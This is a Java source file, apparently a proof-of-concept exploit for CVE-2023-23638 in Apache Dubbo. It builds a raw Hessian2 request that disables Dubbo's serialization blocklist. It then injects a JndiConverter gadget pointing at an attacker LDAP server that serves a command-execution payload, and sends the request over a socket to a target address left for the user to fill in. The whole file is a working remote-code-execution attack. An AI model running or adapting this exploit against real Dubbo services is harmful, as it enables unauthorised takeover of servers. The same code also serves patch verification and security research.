package top.lz2y.vul;

import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.apache.dubbo.common.utils.ConcurrentHashSet;
import org.apache.dubbo.common.utils.PojoUtils;
import org.apache.dubbo.common.utils.SerializeClassChecker;
import top.lz2y.tools.FileUtil;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Random;


/**
 * 漏洞编号:
 *      CVE-2023-23638
 * 适用版本:
 *      Apache Dubbo 2.7.0 to 2.7.21
 *      Apache Dubbo 3.0.x to 3.0.13
 *      Apache Dubbo 3.1.x to 3.1.5
 */
public class CVE202323638 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.21");
            //todo 此处填写Dubbo提供的服务名
        out.writeUTF("top.lz2y.service.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
            //todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        // Step-1
//        getBypassPayload(out);

        // Step-2
            // POC 1: raw.return
        getRawReturnPayload(out, "ldap://127.0.0.1:8072/wNfSybNGMm/Plain/Exec/eyJjbWQiOiJjYWxjIn0=");
            // POC 2: bean
//        getBeanPayload(out, "ldap://127.0.0.1:8072/wNfSybNGMm/Plain/Exec/eyJjbWQiOiJjYWxjIn0=");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("169.254.46.101", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getBypassPayload(Hessian2ObjectOutput out) throws IOException {
        HashMap<String, Object> instanceMap = new HashMap<>();
        instanceMap.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        instanceMap.put("CLASS_DESERIALIZE_BLOCKED_SET", new ConcurrentHashSet<>());
        HashMap<String, Object> scc = new HashMap<>();
        scc.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        scc.put("INSTANCE", instanceMap);
        out.writeObject(new Object[]{scc});

        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap<String, Object> jndi = new HashMap<>();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap<String, Object> map = new HashMap<>();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap<String, Object> map = new HashMap<>();

        map.put("generic", "bean");
        out.writeObject(map);
    }
}
